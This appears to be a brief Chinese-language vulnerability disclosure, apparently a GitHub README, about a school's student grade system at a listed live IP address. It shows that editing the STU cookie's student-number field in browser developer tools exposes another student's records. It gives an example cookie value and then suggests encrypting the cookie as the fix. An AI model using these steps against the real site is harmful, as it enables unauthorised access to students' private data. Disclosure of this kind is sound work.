# 學生成績系統漏洞
[<<回前頁>>](https://github.com/William957-web/SGGScyber)   
[網站連結:http://140.126.151.12/csnskj](http://140.126.151.12/csnskj)  
## 詳情
登入後按下F12開啟開發人員工具，選擇Application打開更改STU項目cookie  
格式如下  
mS%5FNO=學號&Erroring=%A1%40&xLevel=0&IsVar=True&mCLA%5FNO=11010036++&mCLA%5FNA=%A4T%B7q++++  
e.g:  
mS%5FNO=1092145&Erroring=%A1%40&xLevel=0&IsVar=True&mCLA%5FNO=11010036++&mCLA%5FNA=%A4T%B7q++++  
![image](https://user-images.githubusercontent.com/85293841/183595628-b5bd676f-7563-43f0-bb1f-e88228cbf7f9.png)  
## 解決方法:
加密cookie並增加cookie項目使之難以被輕易攻破
